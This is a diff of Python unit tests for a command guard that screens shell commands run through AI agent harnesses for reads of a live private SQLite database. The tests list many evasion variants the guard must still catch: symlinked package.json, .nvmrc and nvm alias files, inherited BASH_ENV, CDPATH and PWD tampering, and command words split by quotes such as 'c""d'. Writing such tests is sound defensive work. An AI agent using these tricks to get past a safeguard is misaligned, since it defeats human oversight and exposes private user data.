+            ('nvm-pnpm-package-live', lambda: link(nvm / 'versions/node/v26.0.0/lib/node_modules/pnpm/package.json', marker), SCRIPT),
+            ('corepack-package-live', lambda: link(corepack / 'v1/pnpm/10.0.0/package.json', marker), SCRIPT),
+            ('path-pnpm-root-package-live', lambda: (regular(str(pnpm_root / 'bin/pnpm.cjs'), ''),
+                                                    link(home / '.local/share/quint-guard/bin/pnpm', pnpm_root / 'bin/pnpm.cjs'),
+                                                    link(pnpm_root / 'package.json', marker)), SCRIPT),
+            ('cwd-package-json-regular', lambda: regular('package.json'), None),
+            ('cwd-package-json-plain-link', lambda: link(self.root / 'package.json', plain), None),
+            ('nvm-alias-directory', lambda: (nvm / 'alias/lts').mkdir(parents=True, exist_ok=True), None),
+        ]
+        for label, setup, expected in rows:
+            setup()
+            try:
+                with patch.dict(os.environ, environment):
+                    for command in commands:
+                        with self.subTest(case=label, command=command):
+                            self.assertEqual(self.classify(command), expected)
+            finally:
+                for path in reversed(made):
+                    if path.is_symlink() or path.exists():
+                        path.unlink()
+                made.clear()
+        # The selector walks from each cwd (here deep/a/b and its HERE, deep/a)
+        # up to the repo root.
+        deep = self.root / 'deep/a/b'
+        self.write('deep/a/b/fixture.sh', (self.root / 'tmp/fixture.sh').read_text())
+        with patch.dict(os.environ, environment):
+            self.assertIsNone(guard.classify('bash fixture.sh', str(deep)))
+            link(self.root / 'deep/package.json', marker)
+            try:
+                self.assertEqual(guard.classify('bash fixture.sh', str(deep)), SCRIPT)
+                (deep / '.git').mkdir()
+                (deep.parent / '.git').mkdir()
+                # Repo roots below the link stop both walks before it.
+                self.assertIsNone(guard.classify('bash fixture.sh', str(deep)))
+            finally:
+                made.pop().unlink()
+                (deep / '.git').rmdir()
+                (deep.parent / '.git').rmdir()
+        # The command must not create selector inputs on the way in.
+        with patch.dict(os.environ, environment):
+            for command in ('ln -s x package.json; bash tmp/fixture.sh', 'cp a .nvmrc && bash tmp/fixture.sh',
+                            'COREPACK_HOME=/tmp/c bash tmp/fixture.sh'):
+                with self.subTest(command=command):
+                    self.assertEqual(self.classify(command), SCRIPT)
+
+    def test_inherited_bash_env_selector_inputs_round_two(self):
+        commands = self.write_plain_subpath_fixture()
+        home, helper, environment = self.repo_node_pin()
+        marker = self.write('marker/.robob/userdata/statev2.sqlite', '{}')
+        # The pinned cd wrapper refreshes in "$(dirname "$0")/..", the fixture's HERE.
+        nested = self.write('nested/tests/fixture.sh', (self.root / 'tmp/fixture.sh').read_text())
+        nested_commands = ('bash nested/tests/fixture.sh', '/bin/bash ' + str(nested),
+                           'offbox run --bg -- bash nested/tests/fixture.sh')
+        with patch.dict(os.environ, environment):
+            for command in nested_commands:
+                with self.subTest(case='nested-clean', command=command):
+                    self.assertIsNone(self.classify(command))
+            (self.root / 'nested/.nvmrc').symlink_to(marker)
+            try:
+                for command in nested_commands:
+                    with self.subTest(case='nested-here-nvmrc-live', command=command):
+                        self.assertEqual(self.classify(command), SCRIPT)
+                # Run from inside the script dir too: HERE is then the cwd's parent.
+                with self.subTest(case='nested-here-from-tests'):
+                    self.assertEqual(guard.classify('bash fixture.sh', str(self.root / 'nested/tests')), SCRIPT)
+            finally:
+                (self.root / 'nested/.nvmrc').unlink()
+        # select.py uses get(name, default), so empty or relative roots follow the cwd.
+        (self.root / 'alias').mkdir()
+        (self.root / 'alias/default').symlink_to(marker)
+        (self.root / 'rel/alias').mkdir(parents=True)
+        (self.root / 'rel/alias/default').symlink_to(marker)
+        (self.root / 'v1/pnpm/10.0.0').mkdir(parents=True)
+        (self.root / 'v1/pnpm/10.0.0/package.json').symlink_to(marker)
+        (self.root / 'rel/v1/pnpm/10.0.0').mkdir(parents=True)
+        (self.root / 'rel/v1/pnpm/10.0.0/package.json').symlink_to(marker)
+        for name in ('NVM_DIR', 'COREPACK_HOME'):
+            for value in ('', 'rel', './rel'):
+                with patch.dict(os.environ, {**environment, name: value}):
+                    for command in commands:
+                        with self.subTest(name=name, value=value, command=command):
+                            self.assertEqual(self.classify(command), SCRIPT)
+        # Lookups by name still work in a directory that cannot be listed.
+        if os.geteuid() != 0:
+            alias = home / '.nvm/alias'
+            alias.mkdir(parents=True)
+            (alias / 'default').symlink_to(marker)
+            alias.chmod(0o111)
+            try:
+                with patch.dict(os.environ, environment):
+                    for command in commands:
+                        with self.subTest(case='unlistable-alias', command=command):
+                            self.assertEqual(self.classify(command), SCRIPT)
+            finally:
+                alias.chmod(0o755)
+            (alias / 'default').unlink()
+            (alias / 'default').write_text('v26\n')
+            with patch.dict(os.environ, environment):
+                for command in commands:
+                    with self.subTest(case='listable-alias-clean', command=command):
+                        self.assertIsNone(self.classify(command))
+
+    def test_inherited_bash_env_fixture_cwd_changes(self):
+        # Each cd refreshes the selector in its target; only the HERE subshell
+        # from the starting cwd, without CDPATH or a changed $0, is proven.
+        self.write_plain_subpath_fixture()
+        original = (self.root / 'tmp/fixture.sh').read_text()
+        home, helper, environment = self.repo_node_pin()
+        marker = self.write('marker/.robob/userdata/statev2.sqlite', '{}')
+        for directory in ('nested/nested', 'elsewhere/nested'):
+            (self.root / directory).mkdir(parents=True)
+            (self.root / directory / '.nvmrc').symlink_to(marker)
+        commands = ('bash nested/tests/fixture.sh', '/bin/bash ' + str(self.root / 'nested/tests/fixture.sh'),
+                    'offbox run --bg -- bash nested/tests/fixture.sh')
+        here = 'HERE="$(cd "$(dirname "$0")/.." && pwd)"\n'
+        rows = [
+            ('unchanged', original, {}, None),
+            ('unchanged-empty-cdpath', original, {'CDPATH': ''}, None),
+            ('extra-top-level-cd', original.replace('set -u\n', 'set -u\ncd "$(dirname "$0")/.."\n', 1), {}, SCRIPT),
+            ('repeated-here-cd', original.replace(here, here + 'X="$(cd "$(dirname "$0")/.." && pwd)"\n', 1), {}, SCRIPT),
+            ('pushd', original.replace('set -u\n', 'set -u\npushd "$(dirname "$0")/.." >/dev/null\n', 1), {}, SCRIPT),
+            ('heredoc-cd', original.replace('src="${@: -2:1}"', 'cd /tmp\nsrc="${@: -2:1}"', 1), {}, SCRIPT),
+            ('inherited-cdpath', original, {'CDPATH': str(self.root / 'elsewhere')}, SCRIPT),
+            ('fixture-cdpath', original.replace('set -u\n', 'set -u\nCDPATH=' + str(self.root / 'elsewhere') + '\n', 1), {'CDPATH': ''}, SCRIPT),
+            ('fixture-exported-cdpath', original.replace('set -u\n', 'set -u\nexport CDPATH=' + str(self.root / 'elsewhere') + '\n', 1), {}, SCRIPT),
+            ('fixture-argv0', original.replace('set -u\n', 'set -u\nBASH_ARGV0=' + str(self.root / 'nested/nested/tests/x.sh') + '\n', 1), {}, SCRIPT),
+        ]
+        # Every other cd form, wherever it sits, and every CDPATH mention.
+        for statement in ('cd -', 'f() { cd "$(dirname "$0")/.."; }; f', '( cd "$(dirname "$0")/.." )',
+                          'declare CDPATH=' + str(self.root / 'elsewhere'), 'read -r CDPATH < /dev/null'):
+            rows.append(('fixture-' + statement, original.replace('set -u\n', 'set -u\n' + statement + '\n', 1), {}, SCRIPT))
+        # Bash drops quotes, escapes and continuations from command words.
+        for statement in ('c""d "$(dirname "$0")/.."', "c'd' \"$(dirname \"$0\")/..\"", "c''d \"$(dirname \"$0\")/..\"",
+                          'c\\d "$(dirname "$0")/.."', 'c\\\nd "$(dirname "$0")/.."', '"cd" "$(dirname "$0")/.."',
+                          'pu""shd "$(dirname "$0")/.." >/dev/null', 'CD""PATH=' + str(self.root / 'elsewhere'),
+                          'P""WD=' + str(self.root / 'elsewhere'), 'sh""opt -s cdable_vars'):
+            rows.append(('fixture-split-' + statement, original.replace('set -u\n', 'set -u\n' + statement + '\n', 1), {}, SCRIPT))
+        # Logical cd joins $PWD; physical mode and cdable_vars change targets.
+        for statement in ('PWD=' + str(self.root / 'elsewhere'), 'export PWD=' + str(self.root / 'elsewhere'),
+                          'OLDPWD=/tmp', 'unset PWD', 'read -r PWD < /dev/null', 'shopt -s cdable_vars',
+                          'set -P', 'set -eP', 'set -o physical'):
+            rows.append(('fixture-' + statement, original.replace('set -u\n', 'set -u\n' + statement + '\n', 1), {}, SCRIPT))
+        for label, source, extra, expected in rows:
+            self.assertTrue(label.startswith('unchanged') or source != original or extra, label)
+            self.write('nested/tests/fixture.sh', source)
+            with patch.dict(os.environ, {**environment, **extra}):
+                for command in commands:
+                    with self.subTest(case=label, command=command):
+                        self.assertEqual(self.classify(command), expected)
+        with patch.dict(os.environ, environment):
+            for command in ('CDPATH=/tmp bash nested/tests/fixture.sh', 'export CDPATH=/tmp; bash nested/tests/fixture.sh'):
+                with self.subTest(command=command):
+                    self.assertEqual(self.classify(command), SCRIPT)
+
+    def test_repo_node_pin_hashes_cover_fork_helpers(self):
+        # Editing local-helpers' repo-node-pin turns the fixture proof off
+        # until the guard reviews and pins the new bytes.
+        import hashlib
+        source = Path(__file__).resolve().parents[2] / 'local-helpers/libexec/repo-node-pin'
+        for part, hashes in guard.REPO_NODE_PIN_HASHES.items():
+            with self.subTest(part=part):
+                self.assertIn(hashlib.sha256((source / part).read_bytes()).hexdigest(), hashes)
+
+    def test_real_repo_node_pin_bash_env_keeps_fixture_proof(self):
+        # Drift in this Mac's installed chain should show up here first.
+        helper = Path.home() / '.local/libexec/repo-node-pin'
+        if not (helper / 'bash-env.sh').is_file():
+            self.skipTest('repo-node-pin is not installed')
+        commands = self.write_plain_subpath_fixture()
+        environment = {'BASH_ENV': str(helper / 'bash-env.sh'), 'ROBOB_REPO_PREVIOUS_BASH_ENV': '',
+                       'ROBOB_REPO_NODE_HELPER': '', 'ROBOB_REPO_NODE_PYTHON': '', 'ZDOTDIR': ''}
+        with patch.dict(os.environ, environment):
+            for command in commands:
+                with self.subTest(command=command):
+                    self.assertEqual(guard.classify_detail(command, str(self.root)), (None, None))
+
     def test_mktemp_fixture_plain_subpath_straight_line(self):
         for root in ('$T', '${T}'):
             # Keep a live-root marker so both cases exercise the source fallback.
@@ -1320,6 +1980,8 @@ class GuardTests(unittest.TestCase):
         command = ['/opt/homebrew/opt/sqlite/bin/sqlite3', '-safe', '-noinit', '--', ':memory:']
         dump = "CREATE TABLE scheduled_tasks(name); INSERT INTO scheduled_tasks VALUES ('it''s 7');\nCREATE TABLE ardud_mission_events(id); INSERT INTO ardud_mission_events VALUES ('m');"
         result = subprocess.run(command + [dump, 'SELECT name FROM scheduled_tasks', 'SELECT id FROM ardud_mission_events'], capture_output=True, text=True)
+        if result.returncode and 'unknown option: -noinit' in result.stderr:
+            self.skipTest('requires SQLite CLI with -noinit support')
         self.assertEqual((result.returncode, result.stdout, result.stderr), (0, "it's 7\nm\n", ''))
         fixture = self.write('fixture.sql', 'SELECT 1;')
         for sql in ('.read ' + str(fixture), "SELECT readfile('" + str(fixture) + "');"):
@@ -2210,7 +2872,7 @@ class LiveDatabaseGuardTests(unittest.TestCase):
         with patch.object(Path, "open", side_effect=AssertionError("must not read database symlink")):
             self.assertEqual(guard.classify("python3 linked.py", str(self.root)), "live-database-read")
 
-    def test_policy_runs_before_identity_offbox_or_coord_and_does_not_log_sql(self):
+    def test_policy_runs_before_identity_or_offbox_and_does_not_log_sql(self):
         command = "sqlite3 ~/.robob/userdata/statev2.sqlite 'select private_sql'"
         for harness in ("claude", "codex"):
             for tool in ("Bash", "bash", "shell", "exec_command", "shell_command", "mcp__test__exec_command", "mcp__test__shell"):
